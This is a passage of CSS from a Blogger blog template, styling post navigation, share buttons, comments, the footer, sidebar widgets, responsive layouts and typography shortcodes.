    line-height: 24px;
    margin-right: 5px;
    overflow: hidden;
    padding: 4px 10px;
    text-decoration: none
}
#post-pager .blog-pager-older-link:hover, #post-pager .blog-pager-newer-link:hover {
color:$maincolor;
background:inherit;
}
#post-pager {
clear:both;
    float: left;
    display: block;
    width: 100%;
    box-sizing: border-box;
margin: 15px 0;
}
#post-pager .blog-pager-older-link, #post-pager .blog-pager-newer-link {
border:0;
text-align:right;
background:none;
color:$darkcolor;
}
#post-pager .blog-pager-newer-link {
    border: 0;
text-align:left;
}
#post-pager #blog-pager-newer-link, #post-pager #blog-pager-older-link {
    width: 50%;
}
#post-pager a b {
    display: block;
    padding: 0 0 5px;
    font-weight: 700;
    letter-spacing: 1px;
    font-size: 15px;
color:$maincolor;
}
#post-pager a span {
    text-transform:capitalize;
}
#post-pager .blog-pager-older-link, #post-pager .blog-pager-newer-link {
    padding:0;
display: block;
}
.item #blog-pager {
    display: none;
    height: 0;
    opacity: 0;
    visibility: hidden;
}
.item .post-footer .share-box {
position: relative;
padding:10px 0;
}
.item .post-footer .share-title {
color: #aeaeae;
display: inline-block;
padding-bottom: 7px;
font-size: 12px;
font-weight: 700;
position: relative;
top: 2px;
text-transform:uppercase;
}
.item .post-footer .share-art {
display:inline-block;
padding: 0;
padding-top: 0;
font-size: 12px;
font-weight: 400;
text-transform: capitalize;
letter-spacing:1px;
}
.item .post-footer .share-art a {
color: #fff;
padding: 3px 8px;
margin-left: 4px;
border-radius: 2px;
display: inline-block;
margin-right: 0;
background: #010101;
}
.item .post-footer .share-art a:hover{color:#fff}
.item .post-footer .share-art .fac-art{background:#3b5998}
.item .post-footer .share-art .fac-art:hover{background:rgba(49,77,145,0.7)}
.item .post-footer .share-art .twi-art{background:#00acee}
.item .post-footer .share-art .twi-art:hover{background:rgba(7,190,237,0.7)}
.item .post-footer .share-art .goo-art{background:#db4a39}
.item .post-footer .share-art .goo-art:hover{background:rgba(221,75,56,0.7)}
.item .post-footer .share-art .pin-art{background:#CA2127}
.item .post-footer .share-art .pin-art:hover{background:rgba(202,33,39,0.7)}
.item .post-footer .share-art .lin-art{background:#0077B5}
.item .post-footer .share-art .lin-art:hover{background:rgba(0,119,181,0.7)}
.item .post-footer .share-art .wat-art{background:#25d266;display:none;}
.item .post-footer .share-art .wat-art:hover{background:rgba(37, 210, 102, 0.73)}
@media only screen and (max-width: 768px) {
.item .post-footer .share-art .wat-art{display:inline-block;}
}
#subscribe-box {
   background-color: #f7f7f7;
    margin: 0;
    padding: 20px;
    overflow: hidden;
    border: 8px solid #f0f0f0;
}
#subscribe-box h4 {
    color: #827459;
    font-size: 16px;
    margin-bottom: 20px;
    text-align: center;
    text-transform: uppercase
}
#subscribe-box .emailfield {
    margin: auto;
    text-align: center;
}
#subscribe-box .emailfield form {
    margin: 0;
}
#subscribe-box .emailfield input {
    padding: 12px;
    color: #bcc4ca;
    border: 1px solid #ebd099;
    font-size: 14px;
    margin-bottom: 10px
}
#subscribe-box .emailfield input:focus {
    color: #454545;
    outline: none;
    border-color: #d5bc88;
}
#subscribe-box .emailfield .submitbutton {
    background-color: #f8695f;
    color: #fff;
    margin: 0;
    font-size: 14px;
    letter-spacing: .7px;
    text-transform: uppercase;
    cursor: pointer;
    border: 0;
    transition: all .3s
}
#subscribe-box .emailfield .submitbutton:active,
#subscribe-box .emailfield .submitbutton:hover {
    background-color: #e0594f;
    color: #fff;
}
#related-posts {
margin-bottom: 10px;
padding: 10px 0;
}
.related li {
width: 23.94%;
display: inline-block;
height: auto;
min-height: 184px;
float: left;
margin-right: 10px;
overflow: hidden;
position: relative;
}
.related li h3 {
margin-top:0;
}
.related-thumb {
width: 100%;
height: 100px;
overflow: hidden;
border-radius: 2px;
}
.related li .related-img {
width: 100%;
height: 100px;
display: block;
position: relative;
transition: all .3s ease-out!important;
-webkit-transition: all .3s ease-out!important;
-moz-transition: all .3s ease-out!important;
-o-transition: all .3s ease-out!important;
}
.related li .related-img:hover {
-webkit-transform: scale(1.1) rotate(-1.5deg)!important;
-moz-transform: scale(1.1) rotate(-1.5deg)!important;
transform: scale(1.1) rotate(-1.5deg)!important;
transition: all .3s ease-out!important;
-webkit-transition: all .3s ease-out!important;
-moz-transition: all .3s ease-out!important;
-o-transition: all .3s ease-out!important;
}
.related-title a {
font-size: 12px;
line-height: 1.4em;
padding: 10px 0 0;
font-weight: 400;
font-style: normal;
letter-spacing: 1px;
color: $darkcolor;
display: block;
}
.related li:nth-of-type(4),
.related li:nth-of-type(8),
.related li:nth-of-type(12) {
margin-right: 0;
}
.related .related-tag {
display:none;
}
.related-overlay {
position: absolute;
left: 0;
top: 0;
z-index: 1;
width: 100%;
height: 100%;
background-color: rgba(40,35,40,0.05);
}
.related-content {
display: block;
bottom: 0;
padding: 0px 0px 11px;
width: 100%;
line-height: 1.2em;
box-sizing: border-box;
z-index: 2;
}
.related .related-content .recent-date {
display:none;
}
.recent-date:before, .p-date:before {
content: '\f017';
font-family: fontawesome;
margin-right: 5px;
}
.comment-form {
overflow:hidden;
}
iframe.blogger-iframe-colorize,
iframe.blogger-comment-from-post {
height: 283px!important
}
.comments-title {
position: relative;
clear: both;
z-index: 1;
margin: 0;
line-height: 33px
}
.comments-title h2 {
display: inline-block;
position: relative;
background-color: #fff;
color: #1c1c1c;
font-size: 18px;
letter-spacing: -.4px;
text-transform: uppercase;
font-weight: 700;
z-index: 1;
margin: 0;
padding-right: 15px
}
.comments-title:after {
content: "";
position: absolute;
z-index: 0;
top: 14px;
left: 0;
width: 100%;
height: 5px;
background-color: #F5F5F5
}
.comments {
clear: both;
margin: 0;
color: #1c1c1c;
background: #ffffff;
padding: 0 10px;
}
.comments .comments-content .comment-thread ol li {
    list-style: none;
}
.comments h4 {
color: #000;
    font-size: 14px;
    padding: 5px 20px;
    font-weight: 700;
    letter-spacing: 1.5px;
    text-transform: Uppercase;
    position: relative;
    text-align: center;
    background: #ffffff;
    z-index: 1;
margin-bottom: 15px;

}
.comments h4:after {
    content: '';
    position: absolute;
    bottom: 0;
    left: 50%;
    width: 40px;
    height: 2px;
    background: #000;
    margin-left: -20px;
}
.comments .comments-content {
margin: 0;
padding: 0
}
.comments .comments-content .comment {
margin-bottom: 0;
padding-bottom: 8px
}
.comments .comments-content .comment:first-child {
padding-top: 0
}
.facebook-tab,
.fb_iframe_widget_fluid span,
.fb_iframe_widget iframe {
width: 100%!important
}
.comments .item-control {
position: static
}
.comments .avatar-image-container {
float: left;
overflow: hidden;
position: absolute
}
.comments .avatar-image-container,
.comments .avatar-image-container img {
height: 45px;
max-height: 45px;
width: 45px;
max-width: 45px;
border-radius: 0
}
.comments .comment-block {
overflow: hidden;
padding: 0 0 10px
}
.comments .comment-block,
.comments .comments-content .comment-replies {
margin-left: 60px;
margin-top: 0
}
.comments .comments-content .inline-thread {
padding: 0
}
.comments .comment-actions {
float: left;
width: 100%;
position: relative;
margin: 0
}
.comments .comments-content .comment-header {
font-size: 14px;
display: block;
overflow: hidden;
clear: both;
margin: 0 0 3px;
padding: 0 0 5px;
border-bottom: 1px dotted #f5f5f5
}
.comments .comments-content .user {
font-style: normal;
font-weight: 500;
display: block;
font-size: 16px
}
.comments .comments-content .icon.blog-author {
display: none
}
.comments .comments-content .comment-content {
float: left;
text-align: left;
font-size: 13px;
line-height: 1.4em;
color: #656565
}
.comments .comment .comment-actions a {
margin-right: 5px;
padding: 2px 5px;
color: #fff;
font-weight: 400;
background-color: #000;
font-size: 10px
}
.comments .comment .comment-actions a:hover {
color: #fff;
background-color: $maincolor;
text-decoration: none
}
.comments .comments-content .datetime {
color: #999;
float: left;
font-size: 11px;
position: relative;
font-style: italic;
margin: 2px 0 0;
display: block
}
.comments .comments-content .datetime:before {
content: '\f017';
font-family: fontawesome;
font-style: normal;
margin-right: 3px
}
.comments .comments-content .comment-header a {
color: inherit
}
.comments .comments-content .comment-header a:hover {
color: $maincolor
}
.comments .thread-toggle {
margin-bottom: 4px
}
.comments .thread-toggle .thread-arrow {
height: 7px;
margin: 0 3px 2px 0
}
.comments .thread-expanded {
padding: 8px 0 0
}
.comments .comments-content .comment-thread {
margin: 0
}
.comments .continue a {
padding: 0 0 0 60px;
font-weight: 400
}
.comments .comments-content .loadmore.loaded {
margin: 0;
padding: 0
}
.comments .comment-replybox-thread {
margin: 0
}
/*****************************************
Footer Bottom CSS
******************************************/
#lower {
margin:auto;
padding: 0px 0px 10px 0px;
width: 100%;
background:#222;
box-shadow: 0 5px 6px rgba(0,0,0,0.4) inset;
    border-top: 4px solid #E6E6E6;
}
#lower-wrapper {
margin:auto;
padding: 20px 0px 20px 0px;
}
#lowerbar-wrapper {
float: left;
margin: 0px 5px auto;
padding-bottom: 20px;
width: 32%;
text-align: justify;
color:#ddd;
line-height: 1.6em;
word-wrap: break-word;
overflow: hidden;
max-width: 375px;
}
.lowerbar {margin: 0; padding: 0;}
.lowerbar .widget {margin: 0; padding: 10px 20px 0px 20px;box-sizing:border-box;}
.lowerbar h2 {
    position: relative;
    overflow: hidden;
    margin: 0;
    font-size: 18px;
    vertical-align: middle;
    padding: 0 0 10px 0;
    border-bottom:1px solid #3D3D3D;
    font-weight: 700;
color:#fff;
    clear: both;
}

.lowerbar ul {
margin: 0 auto;
padding: 0;
list-style-type: none;
}
.lowerbar li {
display:block;
line-height: 1.6em;
margin-left: 0 !important;
list-style-type: none;
}
.lowerbar li a {
text-decoration:none; color: #DBDBDB;
}
.lowerbar li a:hover {
text-decoration:none;
}
.lowerbar li:hover {
display:block;
}
.lowerbar .PopularPosts ul li a, .lowerbar, .lowerbar .ty-bonus .ty-bonos-entry a, .lowerbar .tyard-komet a  {
color:#fff;
}
.lowerbar .PopularPosts .widget-content ul li {
border-bottom: 1px solid rgb(51, 51, 51);
border-top: 0;
}
.lowerbar .PopularPosts .widget-content ul li:last-child {
border: 0;
}
.lowerbar .widget-content {
    padding: 10px 0;
}
/* ######## Footer Css ######################### */
#ty_footer {
    background: #161616;
    color: #ccc;
    font-weight: 300;
    padding: 15px 0px;
}
.ty-copy-container {
    margin: 0 auto;
    overflow: hidden;
}
.ty_footer_copyright a {
    color:#fff;
}
.ty_footer_copyright {
text-align:center;
    display:block;
    line-height: 30px;
}
/* ######## Custom Widget Css ######################### */

.sosmedarl-info h4 {
    background: transparent;
    position: relative;
    padding: 0;
    margin: 0;
    border: 0;
    text-align: center;
    font-size: 120%
}
.sosmedarl-img {
    position: relative;
    max-height: 200px;
    overflow: hidden
}
.sosmedarl-img img {
    max-width: 100%;
    width: 100%;
    transition: all .6s;
}
.sosmedarl-img:hover img {
    transform: scale(1.2) rotate(-10deg)
}
.sosmedarl-img:before {
    content: '';
    background: rgba(0, 0, 0, 0.3);
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    z-index: 2;
    transition: all .3s
}
.sosmedarl-img:hover:before {
    background: rgba(0, 0, 0, 0.6);
}
.aboutfloat-img {
    text-align: center;
}
.sosmedarl-float {
    text-align: center;
    display: inline-block;
}
.sosmedarl-float a {
    background: transparent;
    color: $darkcolor;
    padding: 8px 14px;
    z-index: 2;
    display: table-cell;
    font-size: 90%;
    text-transform: uppercase;
    vertical-align: middle;
    border: 2px solid $maincolor;
    border-radius: 3px;
    transition: all .3s;
}
.sosmedarl-float:hover a {
    background: #e74c3c;
    color: #fff;
    border-color: transparent;
}
.sosmedarl-float a i {
    font-weight: normal;
    margin: 0 5px 0 0
}
.sosmedarl-wrpicon {
    display: block;
    margin: 15px auto 0;
    position: relative;
}
.sosmedarl-wrpicon .extender {
    width: 100%;
    display: block;
}
.extender {
    text-align: center;
    font-size: 16px
}
.extender .sosmedarl-icon {
    display: inline-block;
    border: 0;
    margin: 0;
    padding: 0;
    width: 32%;
}
.extender .sosmedarl-icon a {
    background: #ccc;
    display: inline-block;
    font-weight: 400;
    color: #fff;
    padding: 0 12px;
    line-height: 32px;
    border-radius: 3px;
    font-size: 12px;
    width: 100%;
}
.extender .sosmedarl-icon i {
    font-family: fontawesome;
    margin: 0 3px 0 0
}
.sosmedarl-icon.fbl a {
    background: #3b5998
}
.sosmedarl-icon.twitt a {
    background: #19bfe5
}
.sosmedarl-icon.crcl a {
    background: #d64136
}
.sosmedarl-icon.fbl a:hover,
.sosmedarl-icon.twitt a:hover,
.sosmedarl-icon.crcl a:hover {
    background: #404040
}
.extender .sosmedarl-icon:hover a,
.extender .sosmedarl-icon a:hover {
    color: #fff;
}
.sosmedarl-info {
    margin: 10px 0;
    font-size: 13px;
    text-align: center;
}
.sosmedarl-info p {
    margin: 5px 0
}
.sosmedarl-info h4 {
    margin-bottom: 10px;
    font-size: 16px;
    text-transform: uppercase;
    color: #444;
    font-weight: 700
}
.sosmedarl-info h4 span {
    position: relative;
    display: inline-block;
    padding: 0 10px;
    margin: 0 auto;
}
select#BlogArchive1_ArchiveMenu {
width: 100%;
padding: 10px;
border-color: #777;
}
#adwidegt1 .widget, #adwidegt2 .widget, #adwidegt3 .widget {
    width: 728px;
    max-height: 90px;
    padding: 0;
    max-width: 100%;
    box-sizing: border-box;
display:none;
}
#adwidegt1 .widget {
    margin: 15px auto 10px !important;
display:block !important;
}
#adwidegt2 .widget {
    margin: 15px auto 0 !important;
}
#adwidegt1 .widget h2, #adwidegt2 .widget h2, #adwidegt3 .widget h2 {
display:none;
visibility:hidden;
}
.ads-posting {
    margin: 10px 0 0;
}
.post-footer .ads-posting {
    margin: 15px 0 0;
}
.contact-form-name, .contact-form-email, .contact-form-email-message, .contact-form-widget {
max-width: none;
}
.contact-form-name, .contact-form-email, .contact-form-email-message {
background-color: #EBEBEB;
border: 1px solid #ccc;
}
.contact-form-widget .form {
}
.contact-form-button-submit {
max-width: none;
width: 100%;
height: 35px;
border:0;
background-image: none;
background-color: $maincolor !important;
cursor: pointer;
font-style: normal;
font-weight: 400;
}
.contact-form-name:focus, .contact-form-email:focus, .contact-form-email-message:focus {
border: 0;
box-shadow: none;
}
.contact-form-name:hover, .contact-form-email:hover, .contact-form-email-message:hover {
border: 0;
}
.contact-form-button-submit:hover {
background-color: #303030;
background-image: none;
border: 0;
}
.sidebar .FollowByEmail > h3.title,
.sidebar .FollowByEmail .title-wrap {
margin-bottom: 0
}
#FollowByEmail1 {
    clear: both;
}
.FollowByEmail td {
width: 100%;
float: left;
box-sizing: border-box
}
.FollowByEmail .follow-by-email-inner .follow-by-email-submit {
margin-left: 0;
width: 100%;
border-radius: 0;
height: 30px;
font-size: 11px;
color: #fff;
background-color: $maincolor;
text-transform: uppercase;
font-weight: 700;
letter-spacing: 1px
}
.FollowByEmail .follow-by-email-inner .follow-by-email-submit:hover {
background-color: #000
}
.FollowByEmail .follow-by-email-inner .follow-by-email-address {
padding-left: 10px;
height: 30px;
border: 1px solid #FFF;
margin-bottom: 5px;
box-sizing: border-box;
font-size: 11px;
font-family: inherit
}
.FollowByEmail .follow-by-email-inner .follow-by-email-address:focus {
border: 1px solid #FFF
}
.FollowByEmail .widget-content {
background-color: #2b2b2b;
box-sizing: border-box;
padding: 10px
}
.lowerbar .FollowByEmail .widget-content {
    margin-top: 10px;
}
.FollowByEmail .widget-content:before {
content: "Enter your email address to subscribe to this blog and receive notifications of new posts by email.";
font-size: 14px;
color: #f2f2f2;
line-height: 1.4em;
margin-bottom: 5px;
display: block;
padding: 0 2px
}
.sidebar .PopularPosts .widget-content ul li:first-child,
.sidebar .ty-bonus .ty-wow:first-child {
    padding-top: 0;
    border-top: 0;
}
.sidebar .PopularPosts .widget-content ul li:last-child,
.sidebar .ty-bonus .ty-wow:last-child {
    padding-bottom: 0;
}
.cloud-label-widget-content {
display: inline-block;
text-align: left;
}
.cloud-label-widget-content .label-size {
display: inline-block;
float: left;
font-size: 12px;
line-height: normal;
margin: 0 5px 5px 0;
opacity: 1
}
.cloud-label-widget-content .label-size a {
background: #efefef;
color: #000;
float: left;
font-weight: 400;
line-height: 100%;
margin: 0;
padding: 8px 10px;
text-transform: uppercase;
transition: all .6s;
letter-spacing: 1.5px;
}
.cloud-label-widget-content .label-size a:hover,
.cloud-label-widget-content .label-size a:active {
background:$maincolor;
color: #fff;
}
.cloud-label-widget-content .label-size .label-count {
display:none;
}
.list-label-widget-content li {
display: block;
padding: 8px 0;
border-bottom: 1px solid #ececec;
position: relative
}
.list-label-widget-content li a:before {
content: '\203a';
position: absolute;
left: 0px;
top:5px;
font-size: 22px;
color: $maincolor
}
.lowerbar .list-label-widget-content li a {
color:#fff;
}
.lowerbar .list-label-widget-content li {
border-bottom: 1px solid rgb(51, 51, 51);
border-top: 0;
}
.lowerbar .list-label-widget-content li:last-child {
border: 0;
}
.list-label-widget-content li a {
color: #282828;
font-size: 14px;
padding-left: 20px;
font-weight: 400;
text-transform: capitalize;
letter-spacing: 1.5px;
}
.list-label-widget-content li span:last-child {
color: #f6b2ca;
font-size: 12px;
font-weight: 700;
position: absolute;
top: 9px;
right: 0
}
.PopularPosts .item-thumbnail {
margin: 0 15px 0 0 !important;
width: 80px;
height: 60px;
float: left;
overflow: hidden;
position: relative
}
.PopularPosts .item-thumbnail a {
position: relative;
display: block;
overflow: hidden;
line-height: 0
}
.PopularPosts ul li img {
width: 90px;
height: 65px;
object-fit: cover;
padding: 0;
transition: all .3s ease
}
.PopularPosts .widget-content ul li {
overflow: hidden;
padding: 10px 0;
border-top: 1px solid #f2f2f2
}
.sidebar .PopularPosts .widget-content ul li:first-child,
#sidetabs .PopularPosts .widget-content ul li:first-child {
padding-top: 0;
border-top: 0
}
.sidebar .PopularPosts .widget-content ul li:last-child,
.sidebar .ty-bonus .ty-wow:last-child,
.tab-widget .PopularPosts .widget-content ul li:last-child,
.tab-widget .ty-bonus .ty-wow:last-child {
padding-bottom: 0
}
.PopularPosts ul li a {
color: $darkcolor;
font-weight: 400;
font-size: 13px;
line-height: 1.4em;
transition: color .3s;
letter-spacing:1.5px;
}
.PopularPosts ul li a:hover {
color: #a0d3db
}
.PopularPosts .item-title {
margin: 0 0 4px;
padding: 0;
line-height: 0
}
.item-snippet {
display: none;
font-size: 0;
padding-top: 0
}
.PopularPosts ul {
counter-reset: popularcount;
margin: 0;
padding: 0;
}
.PopularPosts .item-thumbnail::before {
background: rgba(0, 0, 0, 0.3);
bottom: 0px;
content: "";
height: 100px;
width: 100px;
left: 0px;
right: 0px;
margin: 0px auto;
position: absolute;
z-index: 3;
}
/* ######## Responsive Css ######################### */
@media only screen and (max-width: 1200px) {
.body-row {
width: 96% !important;
margin: 0 auto;
float: none;
}
.feat-main-wrapper {
  margin:10px auto;
}
.headerright, .headerleft {
    float: none;
    width: 100%;
    text-align: center;
    height: auto;
    margin: 0 auto;
    clear: both;
}
.headerleft img {
    margin: auto;
    padding-bottom: 15px;
}
.headerright {
    margin: 10px auto 0;
}
}
@media only screen and (max-width: 980px) {
.top-bar-social {
    position: static;
}
#main-wrapper, #sidebar-wrapper, #lowerbar-wrapper {
float: none;
clear: both;
max-width:100%;
width: 100%;
margin: 0 auto;
}
#main-wrapper {
max-width: 100%;
}
#sidebar-wrapper {
max-width:100%;
padding-top: 20px;
}
.tyard-wrapper {
    width: 100%;
    float: none;
    max-width: 100%;
    clear: both;
}
#nav1, #nav {
display: none;
}
.selectnav {
width: auto;
color: #222;
background: #f4f4f4;
border: 1px solid rgba(255,255,255,0.1);
position: relative;
border: 0;
padding: 6px 10px!important;
margin: 5px 0;
}
.selectnav {
display: block;
width: 100%;
max-width:200px;
}
.tm-menu .selectnav {
display:inline-block;
    margin: 10px 0 0 10px;
}
#menu {
text-align:left;
}
}
@media screen and (max-width: 880px) {

#hot-wrapper{width:100%;margin-bottom:15px}
.tyard-ran{padding: 5px;width: 100%;box-sizing: border-box}
.feat-main-wrapper{display:block}
.hot-posts .hot-item.item-0{}
.hot-posts .hot-item{margin-bottom:5px}
ul.hot-posts{height:auto}
#hot-section .show-hot .widget-content{height:auto}
#hot-wrapper{height:auto}
.hot-posts .item-0 .post-title{font-size:14px}
.hot-posts .hot-item.item-1, .hot-posts .hot-item.item-2{margin: 0 0 5px}

.item #content-wrapper {
padding: 0 0 30px;
}
}
@media only screen and (max-width: 768px) {

.top-bar-social, .bottom-bar-social {
    float: none;
    width: 100%;
    clear: both;
    overflow: hidden;
}
.top-bar-menu {
    float: none;
    width: 100%;
    clear: both;
    margin-top: 0;
    margin-bottom: 10px;
text-align: center;
}
.top-bar-social li, .bottom-bar-social li {
    display: inline-block;
    float: none;
}
.selectnav {
    display: inline-block;
}
#search-bar {
    display: none;
}
.ops-404 {
width: 80%!important;
}
.title-404 {
font-size: 160px!important;
}
#post-pager #blog-pager-newer-link {
margin: 0 auto 10px;
}
#post-pager #blog-pager-older-link, #post-pager #blog-pager-newer-link {
float: none;
clear: both;
margin: 0 auto;
display: block;
width:100%;
}
.post-home-image {
    float: none;
    width: 100%;
    margin-bottom: 20px;
    position: relative;
}
.item .post-footer .share-art a span {
    display: none;
}
.related li {
    width: 48%;
}
.related li:nth-child(2) {
margin-right: 0;
}
#meta-post {
text-align: center;
}
.index .post, .archive .post {
text-align:center;
}
.ty_footer_copyright {
    text-align: center;
    display: block;
    clear: both;
}
}
@media only screen and (max-width: 620px) {
.ty-post-share li {
    width: 50%;
}

}
@media only screen and (max-width: 480px) {

.hot-posts .hot-item.item-0{width:100%;height:129px}
.hot-posts .hot-item{width:100%;height:129px;margin-bottom:5px}

.ticker-wrap .title {
    display: none;
}
.tyard .ty-first {
    width: 100%;
    float: none;
    padding: 0;
    clear: both;
}
.templatesyard .ty-feat .ty-rest .tyard-thumb, .templatesyard .ty-feat .ty-rest .yard-img {
    height: 235px;
}
#ticker {
padding:0;
}
.index .post h2,.archive .post h2 {
line-height: 34px;
font-size: 23px;
}
h1.post-title {
font-size: 22px;
margin-bottom: 10px;
}
.related li {
    width: 100%;
margin-right:0;
}
#meta-post {
display: inline-block;
}
#meta-post .post-labels {
display: block;
margin: 0 0 10px;
clear: both;
}
.blog-pager-newer-link .pager-title, .blog-pager-newer-link .pager-heading, .blog-pager-older-link .pager-title, .blog-pager-older-link .pager-heading {
display: none;
}
.blog-pager-older-link .post-nav-icon, .blog-pager-newer-link .post-nav-icon {
line-height: 40px;
width: 100%;
}
.other-meta .other-meta-desc, .other-meta .other-meta-read {
float: none;
display: block;
text-align: center;
}
.share-title {
display: none;
}
.social-btns {
float: none;
text-align: center;
}
#sidebar-wrapper {
max-width: 100%;
}
.index .post-outer {
padding: 0 0 10px 0;
}
.ty-copy-container {
text-align: center;
}
.temp-cred {
float: none;
display: block;
clear: both;
margin: 5px 0 0;
}
.ty_footer_copyright {
float: none;
display: block;
clear: both;
}
}
@media only screen and (max-width: 360px) {
.title-404 {
font-size: 150px!important;
}
.Header .description p, .showpageOf{display:none}
}
@media only screen and (max-width: 300px) {
#sidebar-wrapper {display:none}
.related-thumb {
width: 100%;
float: none;
}
.archive .post h2,.index .post h2 {
line-height: 29px!important;
font-size: 15px!important;
}
article {
overflow: hidden;
}
#blog-pager {
padding: 0;
margin: 0;
}
.item #blog-pager {
    margin: 0 0 15px;
}
.index .resumo span,.archive .resumo span,.ty-author-box img, .breadcrumbs {
display: none;
}
.ty-author-box ul li a {
    padding: 0;
    background: none;
}
.ops-404 {
font-size: 20px!important;
}
.title-404 {
font-size: 120px!important;
}
h1.post-title {
font-size: 17px;
}
.top-bar-social #social a {
width: 24px;
height: 24px;
line-height: 24px;
}
.top-bar-menu, .ty-ran-yard {
display:none;
}
.ty-post-share li {
    width: 100%;
}
.comments .comments-content .comment-header {
width: 100%;
float: none;
clear: both;
margin: 0;
padding: 0;
}
.comments .comments-content .comment-header {
width: 100%;
float: none;
clear: both;
margin: 0px 0 0px -35px;
padding: 0;
}
}
]]></b:skin>

<style>
/*-------Typography and ShortCodes-------*/
.firstcharacter{float:left;color:#27ae60;font-size:75px;line-height:60px;padding-top:4px;padding-right:8px;padding-left:3px}.post-body h1,.post-body h2,.post-body h3,.post-body h4,.post-body h5,.post-body h6{margin-bottom:15px;color:#2c3e50}blockquote{font-style:italic;color:#888;border-left:5px solid #27ae60;margin-left:0;padding:10px 15px}blockquote:before{content:&#39;\f10d&#39;;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;margin-right:10px;color:#888}blockquote:after{content:&#39;\f10e&#39;;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;margin-left:10px;color:#888}.button{background-color:#2c3e50;float:left;padding:5px 12px;margin:5px;color:#fff;text-align:center;border:0;cursor:pointer;border-radius:3px;display:block;text-decoration:none;font-weight:400;transition:all .3s ease-out !important;-webkit-transition:all .3s ease-out !important}a.button{color:#fff}.button:hover{background-color:#27ae60;color:#fff}.button.small{font-size:12px;padding:5px 12px}.button.medium{font-size:16px;padding:6px 15px}.button.large{font-size:18px;padding:8px 18px}.small-button{width:100%;overflow:hidden;clear:both}.medium-button{width:100%;overflow:hidden;clear:both}.large-button{width:100%;overflow:hidden;clear:both}.demo:before{content:&quot;\f06e&quot;;margin-right:5px;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.download:before{content:&quot;\f019&quot;;margin-right:5px;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.buy:before{content:&quot;\f09d&quot;;margin-right:5px;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.visit:before{content:&quot;\f14c&quot;;margin-right:5px;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.widget .post-body ul,.widget .post-body ol{line-height:1.5;font-weight:400}.widget .post-body li{margin:5px 0;padding:0;line-height:1.5}.post-body ul li:before{content:&quot;\f105&quot;;margin-right:5px;font-family:fontawesome}pre{font-family:Monaco, &quot;Andale Mono&quot;, &quot;Courier New&quot;, Courier, monospace;background-color:#2c3e50;background-image:-webkit-linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);background-image:-moz-linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);background-image:-ms-linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);background-image:-o-linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);background-image:linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);-webkit-background-size:100% 50px;-moz-background-size:100% 50px;background-size:100% 50px;line-height:25px;color:#f1f1f1;position:relative;padding:0 7px;margin:15px 0 10px;overflow:hidden;word-wrap:normal;white-space:pre;position:relative}pre:before{content:&#39;Code&#39;;display:block;background:#F7F7F7;margin-left:-7px;margin-right:-7px;color:#2c3e50;padding-left:7px;font-weight:400;font-size:14px}pre code,pre .line-number{display:block}pre .line-number a{color:#27ae60;opacity:0.6}pre .line-number span{display:block;float:left;clear:both;width:20px;text-align:center;margin-left:-7px;margin-right:7px}pre .line-number span:nth-child(odd){background-color:rgba(0, 0, 0, 0.11)}pre .line-number span:nth-child(even){background-color:rgba(255, 255, 255, 0.05)}pre .cl{display:block;clear:both}#contact{background-color:#fff;margin:30px 0 !important}#contact .contact-form-widget{max-width:100% !important}#contact .contact-form-name,#contact .contact-form-email,#contact .contact-form-email-message{background-color:#FFF;border:1px solid #eee;border-radius:3px;padding:10px;margin-bottom:10px !important;max-width:100% !important}#contact .contact-form-name{width:47.7%;height:50px}#contact .contact-form-email{width:49.7%;height:50px}#contact .contact-form-email-message{height:150px}#contact .contact-form-button-submit{max-width:100%;width:100%;z-index:0;margin:4px 0 0;padding:10px !important;text-align:center;cursor:pointer;background:#27ae60;border:0;height:auto;-webkit-border-radius:2px;-moz-border-radius:2px;-ms-border-radius:2px;-o-border-radius:2px;border-radius:2px;text-transform:uppercase;-webkit-transition:all .2s ease-out;-moz-transition:all .2s ease-out;-o-transition:all .2s ease-out;-ms-transition:all .2s ease-out;transition:all .2s ease-out;color:#FFF}#contact .contact-form-button-submit:hover{background:#2c3e50}#contact .contact-form-email:focus,#contact .contact-form-name:focus,#contact .contact-form-email-message:focus{box-shadow:none !important}.alert-message{position:relative;display:block;background-color:#FAFAFA;padding:20px;margin:20px 0;-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px;color:#2f3239;border:1px solid}.alert-message p{margin:0 !important;padding:0;line-height:22px;font-size:13px;color:#2f3239}.alert-message span{font-size:14px !important}.alert-message i{font-size:16px;line-height:20px}.alert-message.success{background-color:#f1f9f7;border-color:#e0f1e9;color:#1d9d74}.alert-message.success a,.alert-message.success span{color:#1d9d74}.alert-message.alert{background-color:#DAEFFF;border-color:#8ED2FF;color:#378FFF}.alert-message.alert a,.alert-message.alert span{color:#378FFF}.alert-message.warning{background-color:#fcf8e3;border-color:#faebcc;color:#8a6d3b}.alert-message.warning a,.alert-message.warning span{color:#8a6d3b}.alert-message.error{background-color:#FFD7D2;border-color:#FF9494;color:#F55D5D}.alert-message.error a,.alert-message.error span{color:#F55D5D}.fa-check-circle:before{content:&quot;\f058&quot;}.fa-info-circle:before{content:&quot;\f05a&quot;}.fa-exclamation-triangle:before{content:&quot;\f071&quot;}.fa-exclamation-circle:before{content:&quot;\f06a&quot;}.post-table table{border-collapse:collapse;width:100%}.post-table th{background-color:#eee;font-weight:bold}.post-table th,.post-table td{border:0.125em solid #333;line-height:1.5;padding:0.75em;text-align:left}@media (max-width: 30em){.post-table thead 